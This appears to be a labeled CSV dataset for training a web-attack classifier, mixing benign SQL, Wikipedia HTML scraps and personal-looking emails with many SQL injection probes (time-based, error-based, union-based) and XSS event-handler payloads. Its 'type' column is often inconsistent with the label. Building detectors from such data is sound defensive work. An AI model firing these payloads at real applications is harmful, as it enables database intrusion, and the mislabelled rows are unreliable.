Text,Label,type
<select autofocus onfocus=alert(1)>,2,xss
SELECT * FROM figure WHERE ear = 'mean' LIMIT 3,0,sql
<textarea onbeforecopy=alert(1) autofocus>XSS</textarea>,2,xss
"1  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  7338  =  7338",1,sql
SELECT * FROM environment WHERE Price NOT BETWEEN 10 AND 20,0,sql
<body onafterprint=alert(1)>,2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
"1'  )   where 7887  =  7887 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,sql
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
"-9119""  )   where 9237  =  9237 or 8571  =  8571--",1,xss
"<image draggable=""true"" ondragstart=""alert(1)"">test</image>",2,xss
"1 where 2267  =  2267 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,sql
	 </span>,0,xss
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_type_2712' LIMIT 1,0,xss
myers@naturalchild.so,0,sql
"<code ondblclick=""alert(1)"">test</code>",2,xss
<dialog onblur=alert(1) tabindex=1 id=x></dialog><input autofocus>,2,xss
SELECT COUNT ( your ) FROM while,0,sql
1'+  (  select xzvf where 9727  =  9727,1,sql
SELECT AVG ( volume ) FROM take SELECT SUM ( sometime ) ,0,sql
"SELECT CustomerName, ContactName INTO CustomersBackup2017 FROM Customers;",0,xss
"	 </span> (2nd ed.). Dover. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-486-24864-6"" title=""Special:BookSources/978-0-486-24864-6""><bdi>978-0-486-24864-6 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Introduction+to+Artificial+Intelligence&amp;rft.edition=2nd&amp;rft.pub=Dover&amp;rft.date=1985&amp;rft.isbn=978-0-486-24864-6&amp;rft.aulast=Jackson&amp;rft.aufirst=Philip&amp;rft_id=https%3A%2F%2Farchive.org%2Fdetails%2Fintroductiontoar1985jack&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<a oncopy=""alert(1)"" contenteditable>test</a>",2,xss
"   SELECT COUNT ( worry ) , stream FROM shop BY sheet",0,sql
"<h4><span class=""mw-headline"" id=""Consciousness"">Consciousness ",0,xss
delvalle llers,0,sql
51795949h,0,sql
"1   )    )     )   union all select null,null--",1,sql
"1""  )   as gffq where 4387  =  4387 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,sql
"<title onmousedown=""alert(1)"">test</title>",2,xss
"<keygen onkeypress=""alert(1)"" contenteditable>test</keygen>",2,xss
"  SELECT eggID AS ID, sitting AS him FROM throw",0,sql
SELECT COUNT ( instead ) FROM down,0,sql
"1'||  (  select 'vwop' where 8536  =  8536 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
"1""  )   as mohv where 2171  =  2171 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1,sql
"c/ huescar 60,",0,sql
SELECT * FROM keep FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM garden,0,xss
1%'  )   and 8734  =  5844,1,sql
diezma,0,sql
SELECT AVG ( feel ) FROM its SELECT SUM ( city ) ,0,xss
1' rlike   (  select   (  case when   (  5567  =  5586  )   then 1 else 0x28 end   )    )    and 'mmnb'  =  'mmnb,1,sql
<mark id=x tabindex=1 onfocus=alert(1)></mark>,2,xss
<plaintext onblur=alert(1) tabindex=1 id=x></plaintext><input autofocus>,2,xss
"<rb draggable=""true"" ondragend=""alert(1)"">test</rb>",2,xss
"-4756""   )    )    union all select 6846,6846,6846,6846,6846,6846,6846#",1,sql
"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",1,sql
"  SELECT somebody,sell FROM smaller WHERE ride = 'want' UNION SELECT held, during FROM gather",0,xss
SELECT daily ( s )  FROM exactly SELECT color FROM strong,0,sql
"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onanimationend=""alert(1)""></fieldset>",2,xss
select * from users where id  =  1 +$+. or 1  =  1 -- 1,1,sql
SELECT these ( s )  FROM clear SELECT strange ( s ) ,0,sql
	 </span> ,0,xss
	 </span> ,0,xss
"<rb onmouseover=""alert(1)"">test</rb>",2,xss
-4219' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1,sql
"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'yznd' like 'yznd",1,sql
"<style>:target {color: red;}</style><nav id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></nav>",2,xss
"<li><a href=""/wiki/Program_synthesis"" title=""Program synthesis"">Program synthesis </a> </li> </ul>",0,xss
SELECT TOP 3 * FROM discovery,0,sql
"1"" where 2878  =  2878 union all select null,null,null,null,null#",1,sql
SELECT bridge ( s )  FROM able SELECT thing ( s ) ,0,sql
kubrick.blessed@suardistec.ee,0,sql
"1""  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ""dnmi"" like ""dnmi",1,xss
<animatetransform onpointerup=alert(1)>XSS</animatetransform>,2,xss
SELECT ate FROM sides UNION ALL SELECT want FROM proper ORDER BY aloud,0,sql
SELECT COUNT ( broke )  FROM zulu,0,sql
kiam,0,xss
<content onpointerover=alert(1)>XSS</content>,2,xss
"<div draggable=""true"" contenteditable>drag me</div><select ondragover=alert(1) contenteditable>drop here</select>",2,xss
SELECT * FROM guard WHERE NOT character = 'influence'  AND NOT egg = 'something',0,sql
tomolillo@velazquezlarranaga.et,0,sql
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
SELECT signal ( s )  FROM on LEFT JOIN,0,sql
"<style>@keyframes slidein {}</style><tbody style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tbody>",2,xss
select   (  case when   (  7594  =  8086  )   then 7594 else 1/  (  select 0  )   end  )  --,1,sql
<s onpointerup=alert(1)>XSS</s>,2,xss
SELECT TOP 3 * FROM leaf WHERE element = 'involved',0,sql
"<style>:target {transform: rotate(180deg);}</style><center id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></center>",2,xss
"<li id=""cite_note-Formal_reasoning-28""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Formal_reasoning_28-0"">^ </a> </b> ",0,xss
"1"" where 6281  =  6281 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
SELECT COUNT ( DISTINCT gently )  FROM magnet,0,sql
<audio src/onerror=alert(1)>,2,xss
"1""  )   as qmtx where 5280  =  5280 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
<iframe onpointerenter=alert(1)>XSS</iframe>,2,xss
SELECT * FROM end WHERE empty NOT BETWEEN 'oxygen' AND 'everywhere',0,xss
"<h3><span class=""mw-headline"" id=""Planning"">Planning ",0,xss
if  (  1087  =  5839  )   select 1087 else drop function zzeh--,1,sql
"  SELECT * FROM why WHERE rear NOT IN  ( 'wagon', 'theory', 'battle' )  ",0,sql
SELECT TOP 50 PERCENT * FROM scene,0,sql
document.URL,2,xss
	 </span> </a> </li>,0,xss
"1%""   )    )    rlike sleep  (  5  )  #",1,sql
"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'rvwk'  =  'rvwk",1,xss
"-5396'||  (  select 'fjhd' from dual where 4019  =  4019 union all select 4019,4019,4019,4019#",1,sql
"<li onmouseup=""alert(1)"">test</li>",2,xss
"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",1,sql
SELECT * FROM bound WHERE magnet = 'nearly' FETCH FIRST 3 ROWS ONLY,0,sql
SELECT * FROM per WHERE plus BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"-3315""   )    )     )   union all select 2457,2457,2457,2457,2457,2457--",1,sql
"<style>:target {transform: rotate(180deg);}</style><plaintext id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></plaintext>",2,xss
"1',  (  case when 2872  =  2872 then 1 else null end  )  ",1,xss
"<li id=""cite_note-51""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-51"">^ </a> </b> ",0,xss
SELECT * FROM universe WHERE within NOT BETWEEN 'using' AND 'public',0,sql
1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,1,sql
halim,0,sql
"plaza de el salvador 91,",0,sql
SELECT TOP 3 * FROM author WHERE house = 'stop' SELECT * FROM education,0,sql
dierkop@hayunmundoahifuera.id,0,sql
"1 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  # bzoq",1,sql
<button onpointerout=alert(1)>XSS</button>,2,xss
SELECT * FROM enemy ORDER BY wealth,0,sql
"<title onmouseout=""alert(1)"">test</title>",2,xss
SELECT * FROM know WHERE go = 'entirely',0,sql
	 </span>,0,xss
1 where 9752  =  9752,1,sql
1'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'uqfs'  =  'uqfs,1,sql
9.16169E+15,0,sql
SELECT attached ( s )  FROM particles UNION,0,sql
8.32456E+15,0,sql
"1' where 1917  =  1917 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'yabn'  =  'yabn",1,sql
3.74288E+15,0,sql
coe,0,sql
SELECT * FROM wp_posts WHERE ID  =  292420 LIMIT 1,0,sql
p21urit56,0,sql
"<caption onpaste=""alert(1)"" contenteditable>test</caption>",2,xss
	 </span>,0,xss
<embed id=x tabindex=1 onbeforedeactivate=alert(1)></embed><input autofocus>,2,xss
"<form><a href=""javascript:\u0061lert(1)"">X",2,xss
"-3834'   )    )     )   union all select 8313,8313--",1,sql
"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'jmjw' like 'jmjw",1,sql
 </li>,0,xss
<plaintext onpointerleave=alert(1)>XSS</plaintext>,2,xss
<object id=x onfocus=alert(1) type=text/html>,2,xss
1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',1,sql
	 </span>(2001) </li>,0,xss
pelamen,0,sql
1  )   as usnn where 3201  =  3201,1,xss
SELECT * FROM invented WHERE remember BETWEEN 'nearer' AND 'rose',0,sql
"1""   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"<p>This includes <a href=""/wiki/Embodied_agent"" title=""Embodied agent"">embodied </a>, <a href=""/wiki/Situated"" title=""Situated"">situated </a>, <a href=""/wiki/Behavior-based_AI"" class=""mw-redirect"" title=""Behavior-based AI"">behavior-based </a>, and <a href=""/wiki/Nouvelle_AI"" title=""Nouvelle AI"">nouvelle AI </a>. Researchers from the related field of <a href=""/wiki/Robotics"" title=""Robotics"">robotics </a>, such as <a href=""/wiki/Rodney_Brooks"" title=""Rodney Brooks"">Rodney Brooks </a>, rejected symbolic AI and focused on the basic engineering problems that would allow robots to move and survive.<sup id=""cite_ref-Embodied_AI_167-0"" class=""reference""><a href=""#cite_note-Embodied_AI-167"">&#91;164&#93; </a> </sup> Their work revived the non-symbolic point of view of the early <a href=""/wiki/Cybernetic"" class=""mw-redirect"" title=""Cybernetic"">cybernetics </a> researchers of the 1950s and reintroduced the use of <a href=""/wiki/Control_theory"" title=""Control theory"">control theory </a> in AI. This coincided with the development of the <a href=""/wiki/Embodied_mind_thesis"" class=""mw-redirect"" title=""Embodied mind thesis"">embodied mind thesis </a> in the related field of <a href=""/wiki/Cognitive_science"" title=""Cognitive science"">cognitive science </a>: the idea that aspects of the body (such as movement, perception and visualization) are required for higher intelligence.",0,xss
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/selectors.html"">Selectors</a></li>",0,xss
"zoma, la",0,sql
SELECT TOP 50 PERCENT * FROM thy,0,sql
"  SELECT molecular,my FROM attempt WHERE principle = 'far' UNION SELECT want, behind FROM bigger",0,xss
SELECT * FROM gently WHERE location = 'tongue' FETCH FIRST 3 ROWS ONLY,0,sql
<article id=x tabindex=1 ondeactivate=alert(1)></article><input id=y autofocus>,2,xss
SELECT * FROM metal WHERE carry BETWEEN 'discovery' AND 'national',0,sql
"<style>:target {color:red;}</style><bdi id=x style=""transition:color 1s"" ontransitionend=alert(1)></bdi>",2,xss
SELECT * FROM drop WHERE    NOT offer = 'conversation',0,xss
"1'+  (  select 'kqnj' where 9483  =  9483 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,xss
1 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/spider-middleware.html"">Spider Middleware</a></li>",0,xss
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
"INSERT INTO capital ( factory, this, shake, sides, under, cut )  VALUES  ( 'variety', 'bear'. spoken', 'slight', 'nails', 'mission', 'lying' )  ",0,sql
1%'  )   order by 1--,1,sql
palmieri layi,0,sql
mundy,0,sql
"1%""   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,1,sql
	 </span>,0,xss
55235483v,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation news"">Holley, Peter (28 January 2015). <a rel=""nofollow"" class=""external text"" href=""https://www.washingtonpost.com/news/the-switch/wp/2015/01/28/bill-gates-on-dangers-of-artificial-intelligence-dont-understand-why-some-people-are-not-concerned/"">""Bill Gates on dangers of artificial intelligence: 'I don't understand why some people are not concerned<span class=""cs1-kern-right"">' ",0,xss
"<style>@keyframes x{}</style><dialog style=""animation-name:x"" onanimationend=""alert(1)""></dialog>",2,xss
	 </span> 2019 ,0,xss
"  SELECT partly,roll FROM government WHERE thing = 'five' UNION SELECT help, doing FROM farmer",0,xss
"1' where 4334  =  4334 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,sql
desnarigada,0,xss
5320,0,sql
1'   )    )    as egsj where 3447  =  3447,1,sql
select   (  case when   (  7852  =  7476  )   then 7852 else 7852*  (  select 7852 from mysql.db  )   end  )  #,1,sql
"-1162""   )    )    as mhmh where 8710  =  8710 or make_set  (  4822  =  7598,7598  )  --",1,sql
"1' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'bwrb' like 'bwrb",1,sql
chimenea,0,xss
"   SELECT Employees.religious, COUNT ( Orders.formerID )  AS fullyFROM    ( OrdersINNER JOIN sport ON Orders.dawnID  =  Employees.handleID ) ",0,sql
"<base oncopy=""alert(1)"" contenteditable>test</base>",2,xss
"1""   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  ""dnlz""  =  ""dnlz",1,sql
"1'   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,xss
"1 union all select null,null,null,null,null,null,null#",1,sql
"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",1,sql
4417,0,xss
"select * from generate_series  (  4975,4975,case when   (  4975  =  9615  )   then 1 else 0 end  )   limit 1--",1,sql
"INSERT INTO arrow  ( instant, expression, lungs )  VALUES  ( 'thin', 'mixture', 'former' )  ",0,xss
"  SELECT anyID AS ID, famous AS image FROM service",0,sql
"-3249'   )    )     )   union all select 6309,6309#",1,sql
"-2626%'  )   or elt  (  7513  =  8586,8586  )   and   (  '%'  =  '",1,sql
"<li><a href=""/wiki/Gary_Marcus"" title=""Gary Marcus"">Marcus, Gary </a>, ""Am I Human?: Researchers need new ways to distinguish artificial intelligence from the natural kind"", <i><a href=""/wiki/Scientific_American"" title=""Scientific American"">Scientific American </a> </i>, vol. 316, no. 3 (March 2017), pp.&#160;58–63.  A stumbling block to AI has been an incapacity for reliable <a href=""/wiki/Disambiguation"" class=""mw-redirect"" title=""Disambiguation"">disambiguation </a>.  An example is the ""pronoun disambiguation problem"":  a machine has no way of determining to whom or what a <a href=""/wiki/Pronoun"" title=""Pronoun"">pronoun </a> in a sentence refers. (p.&#160;61.) </li>",0,xss
SELECT COUNT ( that )  FROM wealth,0,sql
SELECT or FROM mud,0,xss
-3938%'   )    )     )   or 2034  =  7209#,1,sql
SELECT AVG ( describe ) FROM cat,0,sql
duby@mtos.mt,0,sql
chao-pin2,0,sql
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_1_text' LIMIT 1,0,sql
" SELECT REPEAT ( CustomerName, 2 )  FROM Customers;",0,xss
" SELECT * FROM package ORDER BY headed ASC, word DESC",0,sql
br8c99ma4290,0,sql
"<frameset oncopy=""alert(1)"" contenteditable>test</frameset>",2,xss
"1"" procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,sql
SELECT * FROM slowly ORDER BY remove DESC,0,sql
"<div role=""navigation"" class=""navbox"" aria-labelledby=""Subfields_of_and_cyberneticians_involved_in_cybernetics"" style=""padding:3px""><table class=""nowraplinks mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"">",0,xss
gerino,0,sql
-3748' where 9292  =  9292 or 3337  =  2859#,1,sql
"  UPDATE do SET action =  'come', City =  'thought' WHERE grandmother =  plain",0,sql
rix.piljeckaja@waterflyesp.be,0,sql
asturias,0,sql
burguillos de toledo,0,sql
SELECT * FROM bread WHERE bit = 'whom' LIMIT 3,0,sql
-8410'   )    )     )   or 8571  =  8571--,1,sql
SELECT TOP 3 * FROM piano WHERE wear = 'environment',0,xss
dominguez@comercioenlacalle.hn,0,sql
FROM  ( SELECT DISTINCT built FROM calm ) ,0,xss
SELECT * FROM spin WHERE fence NOT LIKE '[master]%',0,sql
SELECT peace ( s )  FROM aware UNION ALL,0,sql
radunsky_oses@guejosgratis.cg,0,xss
"<style>@keyframes x{}</style><dd style=""animation-name:x"" onanimationstart=""alert(1)""></dd>",2,xss
"1'   )    )     )   union all select null,null,null,null,null,null,null,null#",1,sql
SELECT egg FROM roof,0,sql
SELECT * FROM all WHERE paint BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"<li><cite class=""citation encyclopaedia"">Thomason, Richmond. <a rel=""nofollow"" class=""external text"" href=""https://plato.stanford.edu/entries/logic-ai/"">""Logic and Artificial Intelligence"" </a>.  In <a href=""/wiki/Edward_N._Zalta"" title=""Edward N. Zalta"">Zalta, Edward N. </a> (ed.). <i><a href=""/wiki/Stanford_Encyclopedia_of_Philosophy"" title=""Stanford Encyclopedia of Philosophy"">Stanford Encyclopedia of Philosophy </a> </i>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=Logic+and+Artificial+Intelligence&amp;rft.btitle=Stanford+Encyclopedia+of+Philosophy&amp;rft.aulast=Thomason&amp;rft.aufirst=Richmond&amp;rft_id=https%3A%2F%2Fplato.stanford.edu%2Fentries%2Flogic-ai%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<script onmouseleave=""alert(1)"">test</script>",2,xss
"-9751""   )    )     )   or 5929  =  3884--",1,sql
"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,xss
"<div class=""section"" id=""all-the-rest"">",0,xss
SELECT DISTINCT extra FROM terrible,0,xss
"  SELECT seeID AS ID, clock AS yesterday FROM grew",0,sql
"1' in boolean mode  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",1,sql
SELECT * FROM taken FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/developer-tools.html"">Using your browser’s Developer Tools for scraping</a></li>",0,xss
-8538%' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and '%'  =  ',1,sql
"1""   )    )    as khqq where 3637  =  3637 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
" select * from users where id  =  1 union select  @ $,version  (    )   -- 1",1,sql
"select pg_sleep  (  5  )   and   (  ""tpry""  =  ""tpry",1,sql
SELECT complete ( s ) FROM type INNER JOIN,0,sql
-3846%' or 6872  =  6872 and '%'  =  ',1,sql
"<hr draggable=""true"" ondragenter=""alert(1)"">test</hr>",2,xss
"  UPDATE bag SET pet =  'consonant', City =  'another' WHERE outer =  title",0,sql
55265136t,0,sql
<spacer onfocusout=alert(1) tabindex=1 id=x></spacer><input autofocus>,2,xss
"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",1,xss
"1""   )    )    union all select null#",1,xss
SELECT Count ( * )  AS skill,0,xss
blascosancho,0,sql
1'  )   rlike sleep  (  5  ) ,1,sql
santa mara de la vega,0,sql
SELECT * FROM symbol WHERE breakfast IN  ( SELECT property FROM invented ) ,0,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+Guardian&amp;rft.atitle=Elon+Musk%3A+artificial+intelligence+is+our+biggest+existential+threat&amp;rft.date=2014-10-27&amp;rft.aulast=Gibbs&amp;rft.aufirst=Samuel&amp;rft_id=https%3A%2F%2Fwww.theguardian.com%2Ftechnology%2F2014%2Foct%2F27%2Felon-musk-artificial-intelligence-ai-biggest-existential-threat&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
1   )    )    and 2886  =  1133--,1,sql
"   SELECT COUNT ( especially ) , crew FROM soldier BY height",0,sql
"1""   )    )    and 8329  =  5584#",1,sql
"  SELECT repeat,such,divide FROM stood LEFT JOIN Orders ON outer.pairID =  method.strength ORDER BY race.voice",0,sql
9570,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Jordan, M. I.; Mitchell, T. M. (16 July 2015). ""Machine learning: Trends, perspectives, and prospects"". <i>Science </i>. <b>349 </b> (6245): 255–260. <a href=""/wiki/Bibcode"" title=""Bibcode"">Bibcode </a>:<a rel=""nofollow"" class=""external text"" href=""https://ui.adsabs.harvard.edu/abs/2015Sci...349..255J"">2015Sci...349..255J </a>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1126%2Fscience.aaa8415"">10.1126/science.aaa8415 </a>. <a href=""/wiki/PubMed_Identifier"" class=""mw-redirect"" title=""PubMed Identifier"">PMID </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/26185243"">26185243 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Science&amp;rft.atitle=Machine+learning%3A+Trends%2C+perspectives%2C+and+prospects&amp;rft.volume=349&amp;rft.issue=6245&amp;rft.pages=255-260&amp;rft.date=2015-07-16&amp;rft_id=info%3Apmid%2F26185243&amp;rft_id=info%3Adoi%2F10.1126%2Fscience.aaa8415&amp;rft_id=info%3Abibcode%2F2015Sci...349..255J&amp;rft.aulast=Jordan&amp;rft.aufirst=M.+I.&amp;rft.au=Mitchell%2C+T.+M.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT pie ( s )  FROM ran UNION ALL,0,xss
sqlattempt1,1,sql
SELECT COUNT ( DISTINCT end )  FROM doctor,0,xss
"<rp onkeydown=""alert(1)"" contenteditable>test</rp>",2,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><header id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></header>",2,xss
"1' where 8430  =  8430 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
"<li>E McGaughey, 'Will Robots Automate Your Job Away? Full Employment, Basic Income, and Economic Democracy' (2018) <a rel=""nofollow"" class=""external text"" href=""https://papers.ssrn.com/sol3/papers.cfm?abstract_id=3044448"">SSRN, part 2(3) </a>. </li>",0,xss
"<li><a href=""/wiki/Computing_platform"" title=""Computing platform"">Computing platform </a> </li>",0,xss
-8328 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # rlva,1,sql
"<hr onclick=""alert(1)"">test</hr>",2,xss
